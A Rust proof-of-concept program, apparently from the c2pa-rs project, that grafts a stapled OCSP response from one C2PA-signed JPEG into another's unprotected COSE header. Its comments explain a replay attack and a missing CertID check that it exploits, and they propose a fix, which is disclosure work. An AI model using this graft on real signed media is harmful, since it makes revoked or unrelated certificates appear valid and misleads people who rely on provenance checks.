// Graft a stapled OCSP response from one C2PA-signed JPEG into another.
//
// What this is for
// ----------------
// The COSE_Sign1 in a C2PA manifest carries stapled revocation data as an
// `rVals` map in its *unprotected* header (C2PA §14.5.2 / §15.9.1). The
// useful entry is `ocspVals[]`, a list of DER-encoded OCSPResponse blobs.
// Unprotected headers are not covered by the COSE signature -- any holder
// of the asset can add, remove, or substitute entries there without
// invalidating the underlying COSE_Sign1. This PoC takes the OCSP blob
// out of one signed asset and patches it into another.
//
// Two attacker variants the graft demonstrates
// --------------------------------------------
// Variant 1 -- "stale-good replay" (same signing cert).
//   Cert X was good on Monday (stapled), revoked Tuesday. On Wednesday
//   the attacker still holds X's private key and signs a new manifest
//   with a fresh, real RFC 3161 timestamp. Wednesday lies inside the
//   Monday staple's [thisUpdate, nextUpdate] window, so when the
//   attacker grafts Monday's staple onto Wednesday's manifest, the
//   verifier sees certStatus=good + timestamp in window and emits
//   `signingCredential.ocsp.notRevoked`. This is the inherent freshness
//   gap of OCSP stapling (the staple proves status at thisUpdate, not at
//   signing time) -- the only mitigation §15.9.1 offers is the optional
//   online check in §15.9.2.
//
// Variant 2 -- "cross-cert graft" (different signing cert, c2pa-rs-specific).
//   The attacker signs with a completely different cert -- possibly from a
//   different CA, possibly revoked -- and grafts in a staple harvested
//   from any other signed asset. Provided the grafted response's
//   embedded OCSP-responder cert chains to *any* trust anchor the
//   verifier accepts, and the timestamp falls inside its window, the
//   verifier still emits `notRevoked`. The staple is about a different
//   certificate entirely, but the c2pa-rs verifier never checks that.
//
// Is the missing CertID match a spec issue or an implementation issue?
// --------------------------------------------------------------------
// Implementation issue. The C2PA spec at §15.9.1 says:
//   "A validator shall decode OCSP responses per the requirements of
//    RFC 6960, in particular requirements 1 through 4 of section 3.2."
// RFC 6960 §3.2 requirement 1 is:
//   "The certificate identified in a received response corresponds to
//    the certificate that was identified in the corresponding request"
// and requirement 4 is:
//   "The signer is currently authorized to provide a response for the
//    certificate in question."
// Both are predicates about a specific certificate; you cannot satisfy
// them without comparing the staple's CertID (serial + issuer_name_hash
// + issuer_key_hash) to the signing certificate. §15.9.1 also speaks of
// "the relevant certificate" -- the relevance has to come from somewhere,
// and the only candidate is a CertID match.
//
// The c2pa-rs verifier currently performs:
//   * OCSP signature check (responder cert + EKU + chain),
//   * certStatus + thisUpdate/nextUpdate vs. attested time,
// but does *not* compare `single_response.cert_id` to the signing cert
// in `sign1.protected.header.x5chain`. The serial number is even
// extracted in `OcspResponse::from_der_checked` but only stored as a
// String for log messages. A short patch -- compare CertID hashes and
// serial against the signing cert before accepting the staple -- closes
// Variant 2 without any spec change.
//
// What this script does
// ---------------------
//   * Reassembles the JUMBF from the source JPEG, finds its COSE_Sign1,
//     pulls the first DER blob out of `rVals.ocspVals` and reports its
//     CertID(s) so you can see which cert it's actually attesting to.
//   * Does the same for the target JPEG, reporting what (if anything)
//     it already has stapled and the size budget in the COSE_Sign1
//     reservation.
//   * Rewrites the target's COSE_Sign1 unprotected header: replaces (or
//     inserts) `rVals.ocspVals` with `[ source_ocsp_der ]`, repads with
//     pad/pad2 byte-strings so the encoded length is exactly the
//     original target COSE_Sign1 size, and splices the result back into
//     the target's JUMBF.
//   * Re-validates the output and reports the new OCSP-related codes.
//
// Usage
// -----
//   cargo run -p c2pa --example graft_ocsp_staple -- \
//        <source.jpg> <target.jpg> <output.jpg>
//
// where <source.jpg> already has a stapled OCSP (use
// `analyze_ocsp_stapling` to find one) and <target.jpg> is any signed
// JPEG with enough pad room in its COSE_Sign1 to absorb the graft.

use std::io::Cursor;

use anyhow::{anyhow, bail, Context as _, Result};
use byteorder::{BigEndian, ReadBytesExt};
use c2pa::{settings::Settings, Context, Reader};
use coset::{
    cbor::value::Value, CborSerializable, CoseSign1, Label, TaggedCborSerializable,
};
use img_parts::{
    jpeg::{markers, Jpeg, JpegSegment},
    Bytes, DynImage,
};
use jumbf::parser::{ChildBox, SuperBox};
use rasn_ocsp::{BasicOcspResponse, OcspResponseStatus};

mod common;
use common::mime_from_path;

const C2PA_MARKER: [u8; 4] = [0x63, 0x32, 0x70, 0x61]; // "c2pa"
const MAX_JPEG_MARKER_SIZE: usize = 64000;
const SIGNATURE_LABEL: &str = "c2pa.signature";
const RVALS_LABEL: &str = "rVals";
const OCSPVALS_KEY: &str = "ocspVals";
const PAD: &str = "pad";
const PAD2: &str = "pad2";

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 4 {
        bail!("Usage: graft_ocsp_staple <source.jpg> <target.jpg> <output.jpg>");
    }
    let source_path = &args[1];
    let target_path = &args[2];
    let output_path = &args[3];

    if mime_from_path(source_path)? != "image/jpeg"
        || mime_from_path(target_path)? != "image/jpeg"
    {
        bail!("only image/jpeg is supported by this PoC for both source and target");
    }

    // 1) Pull the OCSP DER out of the source asset.
    let source_bytes = std::fs::read(source_path)
        .with_context(|| format!("reading source {source_path}"))?;
    let source_ocsp_der = extract_first_stapled_ocsp(&source_bytes)
        .with_context(|| format!("extracting OCSP staple from {source_path}"))?;
    println!("=== source ({source_path}) ===");
    println!("  stapled OCSP DER: {} bytes", source_ocsp_der.len());
    summarize_ocsp_certids("    ", &source_ocsp_der)?;

    // 2) Read + validate the target so we can report before/after.
    let target_bytes = std::fs::read(target_path)
        .with_context(|| format!("reading target {target_path}"))?;
    let settings = Settings::new()
        .with_toml(include_str!("../tests/fixtures/test_settings.toml"))?;
    let context = Context::new().with_settings(settings)?.into_shared();

    {
        let mut cursor = Cursor::new(&target_bytes);
        let reader =
            Reader::from_shared_context(&context).with_stream("image/jpeg", &mut cursor)?;
        let active = reader
            .validation_results()
            .and_then(|r| r.active_manifest())
            .ok_or_else(|| anyhow!("no active manifest in target {target_path}"))?;
        println!("\n=== target ({target_path}) ===");
        println!("  validation state = {:?}", reader.validation_state());
        let not_revoked = active
            .success()
            .iter()
            .any(|s| s.code() == "signingCredential.ocsp.notRevoked");
        println!("  signingCredential.ocsp.notRevoked success: {not_revoked}");
    }

    // 3) Locate target COSE_Sign1.
    let target_jumbf = reassemble_jumbf_from_jpeg(&target_bytes)?;
    let (cose_start, cose_end) = find_cose_sign1_range(&target_jumbf)?;
    let target_cose = &target_jumbf[cose_start..cose_end];
    println!("  COSE_Sign1 reservation: {} bytes", target_cose.len());
    if let Some(existing) = extract_first_stapled_ocsp(&target_bytes).ok() {
        println!("  target already has a {}-byte stapled OCSP -- will be replaced.", existing.len());
        summarize_ocsp_certids("    (existing) ", &existing)?;
    } else {
        println!("  target has no stapled OCSP -- a fresh rVals.ocspVals will be added.");
    }

    // 4) Graft into target.
    let new_cose = rewrite_cose_sign1_with_ocsp(target_cose, &source_ocsp_der)?;
    if new_cose.len() != target_cose.len() {
        bail!(
            "internal: padded COSE_Sign1 size {} != target reservation {}",
            new_cose.len(),
            target_cose.len()
        );
    }
    println!(
        "\nRe-encoded target COSE_Sign1 ({} bytes, padded to original length).",
        new_cose.len()
    );

    let mut new_jumbf = target_jumbf.clone();
    new_jumbf[cose_start..cose_end].copy_from_slice(&new_cose);

    let output_bytes = embed_jumbf_in_jpeg(&target_bytes, &new_jumbf)?;
    std::fs::write(output_path, &output_bytes)?;
    println!(
        "Wrote grafted asset to {output_path} ({} bytes).",
        output_bytes.len()
    );

    // 5) Validate output and report.
    let mut out_cursor = Cursor::new(&output_bytes);
    let out_reader =
        Reader::from_shared_context(&context).with_stream("image/jpeg", &mut out_cursor)?;
    println!("\n=== Validation of grafted asset ===");
    println!("  state = {:?}", out_reader.validation_state());
    if let Some(am) = out_reader
        .validation_results()
        .and_then(|r| r.active_manifest())
    {
        let not_revoked = am
            .success()
            .iter()
            .any(|s| s.code() == "signingCredential.ocsp.notRevoked");
        println!("  signingCredential.ocsp.notRevoked success: {not_revoked}");
        if !am.informational().is_empty() {
            println!("  informational codes:");
            for s in am.informational() {
                println!("    - {}", s.code());
            }
        }
        if !am.failure().is_empty() {
            println!("  failures:");
            for s in am.failure() {
                println!("    - {}", s.code());
            }
        }
    }
    Ok(())
}

// -----------------------------------------------------------------------------
// OCSP extraction and CertID reporting
// -----------------------------------------------------------------------------

/// Reassemble the JUMBF from the JPEG, locate the COSE_Sign1, find
/// `rVals.ocspVals` in its unprotected header, and return the first DER
/// blob. Errors if any of those steps fails -- in particular if the asset
/// has no staple at all.
fn extract_first_stapled_ocsp(jpeg_bytes: &[u8]) -> Result<Vec<u8>> {
    let jumbf = reassemble_jumbf_from_jpeg(jpeg_bytes)?;
    let (s, e) = find_cose_sign1_range(&jumbf)?;
    let sign1 = parse_cose_sign1(&jumbf[s..e])?;

    let rvals = sign1
        .unprotected
        .rest
        .into_iter()
        .find_map(|(l, v)| match l {
            Label::Text(s) if s == RVALS_LABEL => Some(v),
            _ => None,
        })
        .ok_or_else(|| anyhow!("no `rVals` entry in COSE_Sign1 unprotected header"))?;

    let Value::Map(rvals_map) = rvals else {
        bail!("`rVals` is present but not a CBOR map");
    };

    let ocsp_vals = rvals_map
        .into_iter()
        .find_map(|(k, v)| match k {
            Value::Text(s) if s == OCSPVALS_KEY => v.into_array().ok(),
            _ => None,
        })
        .ok_or_else(|| anyhow!("`rVals` has no `ocspVals` array"))?;

    let first = ocsp_vals
        .into_iter()
        .next()
        .ok_or_else(|| anyhow!("`ocspVals` is empty"))?;

    match first {
        Value::Bytes(b) => Ok(b),
        other => bail!("`ocspVals[0]` is not a CBOR byte string (got {other:?})"),
    }
}

/// Print the CertID(s) that the OCSP response is attesting to, so the
/// reader can see directly that the staple is bound to a specific
/// certificate and not to the asset.
fn summarize_ocsp_certids(indent: &str, der: &[u8]) -> Result<()> {
    let resp: rasn_ocsp::OcspResponse =
        rasn::der::decode(der).map_err(|e| anyhow!("decoding OcspResponse: {e}"))?;
    if resp.status != OcspResponseStatus::Successful {
        println!("{indent}responseStatus: {:?}", resp.status);
        return Ok(());
    }
    let Some(rb) = resp.bytes else {
        println!("{indent}(successful but no responseBytes)");
        return Ok(());
    };
    let basic: BasicOcspResponse = rasn::der::decode(&rb.response)
        .map_err(|e| anyhow!("decoding BasicOcspResponse: {e}"))?;
    println!("{indent}producedAt: {}", basic.tbs_response_data.produced_at);
    for (i, sr) in basic.tbs_response_data.responses.iter().enumerate() {
        println!(
            "{indent}certId[{i}] serial = {}  hashAlg = {}",
            sr.cert_id.serial_number, sr.cert_id.hash_algorithm.algorithm
        );
        match &sr.cert_status {
            rasn_ocsp::CertStatus::Good => println!("{indent}            status = good"),
            rasn_ocsp::CertStatus::Revoked(_) => {
                println!("{indent}            status = REVOKED")
            }
            rasn_ocsp::CertStatus::Unknown(_) => println!("{indent}            status = unknown"),
        }
    }
    Ok(())
}

// -----------------------------------------------------------------------------
// COSE_Sign1 rewrite
// -----------------------------------------------------------------------------

/// Parse the target COSE_Sign1, set `rVals = { "ocspVals": [ocsp_der] }`
/// in the unprotected header (replacing any existing rVals), and re-encode
/// at exactly the original byte length using pad/pad2.
fn rewrite_cose_sign1_with_ocsp(cose_bytes: &[u8], ocsp_der: &[u8]) -> Result<Vec<u8>> {
    let target_size = cose_bytes.len();
    let tagged = !cose_bytes.is_empty() && cose_bytes[0] == 0xD2;
    let mut sign1 = parse_cose_sign1(cose_bytes)?;

    // Drop any existing rVals; we'll write a fresh one with just our blob
    // in ocspVals so the result is unambiguous in the analyzer.
    sign1
        .unprotected
        .rest
        .retain(|(l, _)| !matches!(l, Label::Text(s) if s == RVALS_LABEL));

    let new_rvals = Value::Map(vec![(
        Value::Text(OCSPVALS_KEY.to_string()),
        Value::Array(vec![Value::Bytes(ocsp_der.to_vec())]),
    )]);
    sign1
        .unprotected
        .rest
        .push((Label::Text(RVALS_LABEL.to_string()), new_rvals));

    pad_to_size(&mut sign1, target_size, tagged)
}

fn parse_cose_sign1(cose_bytes: &[u8]) -> Result<CoseSign1> {
    let tagged = !cose_bytes.is_empty() && cose_bytes[0] == 0xD2;
    if tagged {
        CoseSign1::from_tagged_slice(cose_bytes)
            .map_err(|e| anyhow!("parsing tagged COSE_Sign1: {e:?}"))
    } else {
        CoseSign1::from_slice(cose_bytes).map_err(|e| anyhow!("parsing COSE_Sign1: {e:?}"))
    }
}

/// Re-encode `sign1` at exactly `target_size` bytes by manipulating the
/// `pad` (and optionally `pad2`) byte-strings in the unprotected header.
/// Same as `strip_ocsp::pad_to_size` / `strip_timestamp::pad_to_size`.
fn pad_to_size(sign1: &mut CoseSign1, target_size: usize, tagged: bool) -> Result<Vec<u8>> {
    fn encode(s: &CoseSign1, tagged: bool) -> Result<Vec<u8>> {
        let s = s.clone();
        if tagged {
            s.to_tagged_vec()
                .map_err(|e| anyhow!("encoding tagged COSE_Sign1: {e:?}"))
        } else {
            s.to_vec()
                .map_err(|e| anyhow!("encoding COSE_Sign1: {e:?}"))
        }
    }

    sign1.unprotected.rest.retain(|(l, _)| match l {
        Label::Text(s) => s != PAD && s != PAD2,
        _ => true,
    });

    let base = encode(sign1, tagged)?.len();
    if base > target_size {
        bail!(
            "grafted COSE_Sign1 base size {base} exceeds target reservation {target_size} -- \
             the source's OCSP blob is too large to fit into this target's pad budget"
        );
    }
    if base == target_size {
        return encode(sign1, tagged);
    }

    sign1
        .unprotected
        .rest
        .push((Label::Text(PAD.to_string()), Value::Bytes(Vec::new())));
    let pad_idx = sign1.unprotected.rest.len() - 1;

    let mut pad_len: usize = 0;
    let mut overshoot_size: Option<usize> = None;
    for _ in 0..256 {
        sign1.unprotected.rest[pad_idx].1 = Value::Bytes(vec![0u8; pad_len]);
        let size = encode(sign1, tagged)?.len();
        if size == target_size {
            return encode(sign1, tagged);
        }
        if size > target_size {
            overshoot_size = Some(size);
            break;
        }
        pad_len += target_size - size;
    }

    let overshoot_size = match overshoot_size {
        Some(s) => s,
        None => bail!("padding loop did not converge for target {target_size}"),
    };

    const PAD2_HEADROOM: usize = 16;
    sign1
        .unprotected
        .rest
        .push((Label::Text(PAD2.to_string()), Value::Bytes(Vec::new())));
    let pad2_idx = sign1.unprotected.rest.len() - 1;

    let drop = (overshoot_size - target_size) + PAD2_HEADROOM;
    pad_len = pad_len.saturating_sub(drop);

    for _ in 0..PAD2_HEADROOM + 8 {
        sign1.unprotected.rest[pad_idx].1 = Value::Bytes(vec![0u8; pad_len]);
        sign1.unprotected.rest[pad2_idx].1 = Value::Bytes(Vec::new());
        let base = encode(sign1, tagged)?.len();
        if base > target_size {
            if pad_len == 0 {
                bail!("cannot fit COSE_Sign1 even with empty pads (base {base} > {target_size})");
            }
            pad_len = pad_len.saturating_sub(1);
            continue;
        }
        if base == target_size {
            sign1.unprotected.rest.pop();
            return encode(sign1, tagged);
        }

        let mut pad2_len: usize = 0;
        for _ in 0..256 {
            sign1.unprotected.rest[pad2_idx].1 = Value::Bytes(vec![0u8; pad2_len]);
            let size = encode(sign1, tagged)?.len();
            if size == target_size {
                return encode(sign1, tagged);
            }
            if size > target_size {
                break;
            }
            pad2_len += target_size - size;
        }
        if pad_len == 0 {
            break;
        }
        pad_len -= 1;
    }

    bail!(
        "unable to pad COSE_Sign1 to target {target_size} bytes -- \
         the grafted payload may be too close to the reservation limit"
    )
}

// -----------------------------------------------------------------------------
// JPEG <-> JUMBF -- same plumbing as strip_ocsp.rs / strip_timestamp.rs
// -----------------------------------------------------------------------------

fn reassemble_jumbf_from_jpeg(jpeg_bytes: &[u8]) -> Result<Vec<u8>> {
    let dimg = DynImage::from_bytes(Bytes::copy_from_slice(jpeg_bytes))
        .map_err(|e| anyhow!("could not parse JPEG: {e:?}"))?
        .ok_or_else(|| anyhow!("not a JPEG"))?;

    let jpeg = match dimg {
        DynImage::Jpeg(j) => j,
        _ => bail!("only JPEG supported"),
    };

    let mut buffer: Vec<u8> = Vec::new();
    let mut cai_en: Vec<u8> = Vec::new();
    let mut cai_seg_cnt: u32 = 0;

    for segment in jpeg.segments_by_marker(markers::APP11) {
        let raw = segment.contents();
        if raw.len() <= 16 {
            continue;
        }
        let en = raw[2..4].to_vec();
        let mut z_cursor = Cursor::new(&raw[4..8]);
        let z = z_cursor.read_u32::<BigEndian>()?;

        let continuation = !cai_en.is_empty() && cai_en == en;

        if cai_seg_cnt > 0 && continuation {
            if z <= cai_seg_cnt {
                cai_en.clear();
                continue;
            }
            buffer.extend_from_slice(&raw[16..]);
            cai_seg_cnt += 1;
        } else if raw.len() > 28 {
            let jumb_type = &raw[24..28];
            if jumb_type == C2PA_MARKER {
                buffer.extend_from_slice(&raw[8..]);
                cai_seg_cnt = 1;
                cai_en.clone_from(&en);
            }
        }
    }

    if buffer.is_empty() {
        bail!("no C2PA JUMBF found in JPEG APP11 segments");
    }
    Ok(buffer)
}

fn embed_jumbf_in_jpeg(jpeg_bytes: &[u8], new_jumbf: &[u8]) -> Result<Vec<u8>> {
    let mut jpeg = Jpeg::from_bytes(Bytes::copy_from_slice(jpeg_bytes))
        .map_err(|e| anyhow!("could not parse JPEG for write: {e:?}"))?;

    let insertion_point = delete_cai_segments(&mut jpeg)?
        .map(|i| if i > 0 { i - 1 } else { 0 })
        .unwrap_or(0);

    let jumbf_len = new_jumbf.len();
    let num_segments = (jumbf_len / MAX_JPEG_MARKER_SIZE) + 1;
    let mut chunks = new_jumbf.chunks(MAX_JPEG_MARKER_SIZE);

    for seg in 1..num_segments + 1 {
        let ci = vec![0x4a, 0x50]; // "JP"
        let en = vec![0x02, 0x11];
        let z = u32::try_from(seg).map_err(|_| anyhow!("too many JUMBF segments"))?;

        let mut seg_data: Vec<u8> = Vec::new();
        seg_data.extend(ci);
        seg_data.extend(en);
        seg_data.extend(z.to_be_bytes());
        if seg > 1 {
            let lbox_tbox = new_jumbf
                .get(0..8)
                .ok_or_else(|| anyhow!("JUMBF too small to read LBox/TBox"))?;
            seg_data.extend(lbox_tbox);
        }
        if let Some(next) = chunks.next() {
            seg_data.extend(next);
        }

        let app11 = JpegSegment::new_with_contents(markers::APP11, Bytes::from(seg_data));
        let insert_at = seg + insertion_point;
        if insert_at > jpeg.segments().len() {
            bail!("JPEG JUMBF segment insertion overflow");
        }
        jpeg.segments_mut().insert(insert_at, app11);
    }

    let mut out: Vec<u8> = Vec::new();
    jpeg.encoder()
        .write_to(&mut out)
        .map_err(|e| anyhow!("writing JPEG: {e:?}"))?;
    Ok(out)
}

fn delete_cai_segments(jpeg: &mut Jpeg) -> Result<Option<usize>> {
    let cai_segs = find_cai_segments(jpeg)?;
    let insertion_point = cai_segs.first().copied();
    for idx in cai_segs.iter().rev() {
        jpeg.segments_mut().remove(*idx);
    }
    Ok(insertion_point)
}

fn find_cai_segments(jpeg: &Jpeg) -> Result<Vec<usize>> {
    let mut out = Vec::new();
    let mut cai_en: Vec<u8> = Vec::new();
    let mut cai_seg_cnt: u32 = 0;

    for (i, segment) in jpeg.segments().iter().enumerate() {
        if segment.marker() != markers::APP11 {
            continue;
        }
        let raw = segment.contents();
        if raw.len() <= 16 {
            continue;
        }
        let en = raw[2..4].to_vec();
        let continuation = !cai_en.is_empty() && cai_en == en;
        if cai_seg_cnt > 0 && continuation {
            cai_seg_cnt += 1;
            out.push(i);
        } else if raw.len() > 28 {
            let jumb_type = &raw[24..28];
            if jumb_type == C2PA_MARKER {
                out.push(i);
                cai_seg_cnt = 1;
                cai_en.clone_from(&en);
            }
        }
    }
    Ok(out)
}

fn find_cose_sign1_range(jumbf: &[u8]) -> Result<(usize, usize)> {
    let (root, _) =
        SuperBox::from_slice(jumbf).map_err(|e| anyhow!("parsing JUMBF: {e:?}"))?;

    let sig_super = find_descendant_with_label(&root, SIGNATURE_LABEL)
        .ok_or_else(|| anyhow!("`{SIGNATURE_LABEL}` super box not found in JUMBF"))?;

    let sig_data = sig_super
        .child_boxes
        .iter()
        .find_map(|c| match c {
            ChildBox::DataBox(db) => Some(db),
            _ => None,
        })
        .ok_or_else(|| anyhow!("`{SIGNATURE_LABEL}` has no data box"))?;

    let cose_payload = match &sig_data.tbox.0 {
        b"cbor" => &sig_data.data[..],
        b"uuid" => {
            if sig_data.data.len() < 17 {
                bail!("signature `uuid` box too small to hold UUID + COSE_Sign1");
            }
            &sig_data.data[16..]
        }
        other => bail!(
            "expected `cbor` or `uuid` data box in {SIGNATURE_LABEL}, got `{}`",
            std::str::from_utf8(other).unwrap_or("?")
        ),
    };
    let start = offset_in(jumbf, cose_payload)?;
    let end = start + cose_payload.len();
    Ok((start, end))
}

fn find_descendant_with_label<'a>(root: &'a SuperBox<'a>, label: &str) -> Option<&'a SuperBox<'a>> {
    if root.desc.label == Some(label) {
        return Some(root);
    }
    for child in &root.child_boxes {
        if let ChildBox::SuperBox(sbox) = child {
            if let Some(found) = find_descendant_with_label(sbox, label) {
                return Some(found);
            }
        }
    }
    None
}

fn offset_in(parent: &[u8], child: &[u8]) -> Result<usize> {
    let parent_start = parent.as_ptr() as usize;
    let parent_end = parent_start + parent.len();
    let child_start = child.as_ptr() as usize;
    if child_start < parent_start || child_start + child.len() > parent_end {
        bail!("child slice is not inside parent buffer");
    }
    Ok(child_start - parent_start)
}
